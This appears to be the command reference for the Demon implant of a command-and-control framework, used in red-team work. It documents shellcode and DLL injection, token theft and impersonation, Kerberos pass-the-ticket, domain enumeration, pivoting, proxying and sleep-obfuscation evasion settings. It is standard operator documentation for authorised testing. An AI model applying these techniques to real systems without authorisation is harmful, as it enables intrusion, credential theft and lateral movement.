---
title: Commands
description: Complete reference for all Demon commands - syntax, options, and usage notes.
---

All commands are entered in the agent console. Arguments in `<angle brackets>` are required; `[square brackets]` are optional.

---

## Sleep

```
sleep <seconds> [jitter%]
```

Sets the beacon interval. `jitter%` randomises the actual delay: a value of `20` means ±20% of the base interval.

```
sleep 60 10     # 60s ± 10%
sleep 0         # interactive mode, no obfuscation, instant response
```

> When `sleep > 0` and no jobs are running, Demon applies the configured sleep obfuscation technique (Ekko / Zilean / Foliage) and duplicates the call stack before sleeping.

---

## Information gathering

### whoami

```
whoami
```

Prints the current user, domain, SID, and token integrity level.

### env

```
env
```

Lists all environment variables of the current process.

### screenshot

```
screenshot
```

Captures a screenshot of every monitor and returns the image to the client.

### ps / proc list

```
ps
proc list
```

Returns the full process list: PID, PPID, name, session, architecture, and owner.

---

## File system

### ls

```
ls [path]
```

Lists a directory. Defaults to the current working directory. Returns name, type, size, last-modified date, and Windows attributes (`d`/`r`/`h`/`s`/`a`).

### cd

```
cd <path>
```

Changes the current working directory of the implant.

### pwd

```
pwd
```

Prints the current working directory.

### cat

```
cat <file>
```

Reads and returns the content of a file.

### download

```
download <remote-path>
```

Downloads a file from the target to the operator client. Large files are transferred in chunks as a background job. Track progress with [`transfer list`](#transfer).

### upload

```
upload <local-path> <remote-path>
```

Uploads a file from the operator client to the target.

### mkdir

```
mkdir <path>
```

Creates a directory (and any missing parent directories).

### rm

```
rm <path>
```

Deletes a file or directory recursively.

### cp

```
cp <source> <destination>
```

Copies a file.

### mv

```
mv <source> <destination>
```

Moves or renames a file.

---

## Execution

### shell

```
shell <command>
```

Executes a command via `cmd.exe /c`. Output is captured and returned.

### powershell

```
powershell <command>
```

Executes a command via `powershell.exe -c`. Output is captured and returned.

### run

```
run <executable> [args]
```

Starts a process directly (no shell). Output is captured if the process exits.

### inline-execute (BOF)

```
inline-execute <bof.x64.o> [args]
```

Executes a [Beacon Object File](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm) in the implant process. The BOF is loaded, relocated, and run in-process using the CoffeeLdr engine.

**Execution mode** (controlled by [`config coffee-threaded`](#config)):
- **Threaded (default)**: BOF runs in a new thread registered as a background job. Non-blocking.
- **Non-threaded**: BOF runs synchronously in the beacon thread.

**VEH mode** (controlled by [`config coffee-veh`](#config)): installs a vectored exception handler so BOFs that trigger exceptions (e.g. NTSTATUS errors from Nt* APIs) are caught and reported instead of crashing the implant.

Arguments are packed using Cobalt Strike / Havoc BOF argument format. From a Python module:

```python
bof_args = demon.packer()
bof_args.addstr("WORKGROUP")
demon.InlineExecute(demon.ConsoleWrite, "path/to/bof.x64.o", bof_args.getbuffer())
```

### dotnet inline-execute

```
dotnet inline-execute <assembly.exe> [args]
```

Loads and executes a .NET assembly in-process using the CLR hosting API. Only one CLR instance is active at a time; subsequent calls reuse the running CLR.

### dotnet versions

```
dotnet versions
```

Lists the installed .NET Framework versions on the target.

### shellcode inject

```
shellcode inject <pid> <way> [args]
```

Injects shellcode into a running process.

| `way` | Behaviour |
|---|---|
| `spawn` | Spawn the configured `Spawn64` / `Spawn32` process, inject, run |
| `inject` | Inject into an existing PID |
| `execute` | Execute shellcode in the current process |

The memory allocation and execution technique are set globally with [`config memory-alloc`](#config) and [`config inject-technique`](#config).

### inject-dll

```
inject-dll <pid> <dll-path>
```

Injects a DLL into a remote process using the configured injection technique.

### spawn-dll

```
spawn-dll <dll-path> [args]
```

Spawns the configured sacrifice process, maps a DLL into it, and executes it.

---

## Process management

### proc list

```
proc list
```

Full process list. Alias for `ps`.

### proc kill

```
proc kill <pid>
```

Terminates a process.

### proc create

```
proc create <state> <executable> [args]
```

Starts a new process.

| `state` | Effect |
|---|---|
| `suspended` | Process is created suspended (`CREATE_SUSPENDED`) |
| `normal` | Process starts immediately |

### proc module

```
proc module <pid>
```

Lists all DLLs loaded in a process (name, base address, size).

### proc grep

```
proc grep <name>
```

Searches for a running process by name (case-insensitive, partial match).

### proc memory

```
proc memory <pid> <protection>
```

Returns all memory regions in a process that match a given protection mask (e.g. `RWX`, `RX`).

---

## Token management

The token vault stores stolen / crafted tokens for use across the session.

### token getuid

```
token getuid
```

Prints the user associated with the current token, including impersonation level.

### token list

```
token list
```

Lists all tokens stored in the vault with their ID, user, and type.

### token find-tokens

```
token find-tokens
```

Scans running processes for tokens that can be stolen. Useful for finding high-privilege tokens on the system.

### token steal

```
token steal <pid> [handle]
```

Opens the process token (or a specific handle), duplicates it, and adds it to the vault. Requires `SeDebugPrivilege` or to be running in the context of a process that can open the target.

### token impersonate

```
token impersonate <vault-id>
```

Impersonates a token from the vault. All subsequent operations run under that identity.

### token make

```
token make <domain> <user> <password>
```

Creates a new token via `LogonUser` using supplied credentials, and adds it to the vault.

### token privs-get

```
token privs-get
```

Enables all privileges present in the current token (calls `AdjustTokenPrivileges` for each).

### token privs-list

```
token privs-list
```

Lists all privileges in the current token with their enabled/disabled state.

### token revert

```
token revert
```

Reverts to the original process token (drops any impersonated token).

### token remove

```
token remove <vault-id>
```

Removes a specific token from the vault and closes its handle.

### token clear

```
token clear
```

Removes all tokens from the vault.

---

## Network reconnaissance

The `net` command group enumerates Active Directory and Windows network resources using standard Win32 APIs (`NetApi32`, `NetWkstaUserEnum`, etc.). No LDAP, no external tooling.

### net domain

```
net domain
```

Returns the DNS domain name of the current machine.

### net logons

```
net logons [\\server]
```

Lists currently logged-on users on the local or a remote machine.

### net sessions

```
net sessions [\\server]
```

Lists active sessions on the local or a remote machine (SMB sessions).

### net computer

```
net computer [\\domain]
```

Enumerates computers in the domain.

### net dclist

```
net dclist [\\domain]
```

Lists domain controllers for the current or specified domain.

### net share

```
net share [\\server]
```

Lists shares on the local or a remote machine.

### net localgroup

```
net localgroup [group] [\\server]
```

Lists local groups, or members of a specific local group.

### net group

```
net group [group] [\\domain]
```

Lists domain global groups, or members of a specific group.

### net user

```
net user [username] [\\domain]
```

Lists domain users, or details for a specific user.

---

## Kerberos

Kerberos operations interact directly with the Windows LSASS ticket store via `LsaCallAuthenticationPackage`.

### kerberos luid

```
kerberos luid
```

Returns the Locally Unique Identifier (LUID) of the current logon session.

### kerberos klist

```
kerberos klist [luid]
```

Lists Kerberos tickets in the current (or specified) logon session.

### kerberos ptt

```
kerberos ptt <ticket.kirbi>
```

Passes a base64-encoded `.kirbi` ticket into the current or a specified logon session (`Pass-the-Ticket`).

### kerberos purge

```
kerberos purge [luid]
```

Purges all Kerberos tickets from the current or a specified logon session.

---

## Job management

Long-running tasks (shellcode injection, keylogger, long BOF, etc.) run as background jobs. Active jobs suppress sleep obfuscation.

### job list

```
job list
```

Lists all running and suspended jobs with their ID, type, and status.

### job suspend

```
job suspend <id>
```

Suspends a background job.

### job resume

```
job resume <id>
```

Resumes a suspended job.

### job kill

```
job kill <id>
```

Terminates a job and frees associated resources.

---

## Transfers

Background file transfers run as jobs and can be paused and resumed.

### transfer list

```
transfer list
```

Lists active downloads/uploads with ID, path, progress, and speed.

### transfer stop

```
transfer stop <id>
```

Pauses a transfer.

### transfer resume

```
transfer resume <id>
```

Resumes a paused transfer.

### transfer remove

```
transfer remove <id>
```

Cancels and removes a transfer.

---

## Pivoting

Demon supports two pivot transports: **SMB named pipe** and **TCP**. Pivots allow chaining agents through a compromised host that has no direct C2 reach.

### pivot list

```
pivot list
```

Lists all connected SMB and TCP pivot children.

### pivot smb connect

```
pivot smb connect <\\target\pipe-name>
```

Connects to a Demon child listening on an SMB named pipe. The child must already be running with `TRANSPORT_SMB`.

### pivot smb disconnect

```
pivot smb disconnect <id>
```

Disconnects an SMB pivot.

### pivot tcp listen

```
pivot tcp listen <port>
```

Opens a TCP server on the current host for incoming pivot connections.

### pivot tcp connect

```
pivot tcp connect <host> <port>
```

Connects to a TCP pivot listener on another host.

### pivot tcp disconnect

```
pivot tcp disconnect <id>
```

Disconnects a TCP pivot.

---

## Networking

### socks5 start

```
socks5 start [port]
```

Starts a SOCKS5 proxy server. Traffic is tunnelled through the implant to the target network. Default port: `1080`.

### socks5 stop

```
socks5 stop
```

Stops the SOCKS5 proxy.

### rportfwd add

```
rportfwd add <listen-port> <forward-host> <forward-port>
```

Creates a reverse port forward: the teamserver listens on `listen-port` and forwards connections through the implant to `forward-host:forward-port`.

### rportfwd list

```
rportfwd list
```

Lists active reverse port forwards.

### rportfwd remove

```
rportfwd remove <listen-port>
```

Removes a reverse port forward.

### rportfwd clear

```
rportfwd clear
```

Removes all reverse port forwards.

---

## Config

Runtime configuration. Changes persist for the lifetime of the implant session.

```
config <option> [value]
config           # print current config (show all)
```

| Option | Description |
|---|---|
| `sleep-technique <1\|2\|3>` | Sleep obfuscation: 1=Ekko, 2=Zilean, 3=Foliage |
| `sleep-mask <on\|off>` | Enable/disable sleep masking |
| `verbose <on\|off>` | Toggle verbose debug output |
| `coffee-threaded <on\|off>` | BOF execution: threaded vs inline |
| `coffee-veh <on\|off>` | BOF vectored exception handler |
| `memory-alloc <1\|2>` | Memory allocation: 1=NtAllocate (syscall), 2=VirtualAllocEx |
| `memory-execute <1\|2>` | Code execution: 1=NtCreateThreadEx (syscall), 2=CreateRemoteThread |
| `inject-technique <1\|2\|3>` | Injection: 1=Win32, 2=Syscall (default), 3=APC |
| `spawn64 <path>` | x64 sacrifice process for fork-and-run |
| `spawn32 <path>` | x86 sacrifice process for fork-and-run |
| `thread-start-addr <lib> <func> [offset]` | Spoof implant thread start address (sleep masking) |
| `inject-spoof-addr <lib> <func> [offset]` | Spoof injection thread start address |
| `kill-date <YYYY-MM-DD>` | Update kill date |
| `working-hours <HH:MM-HH:MM>` | Update working hours window |
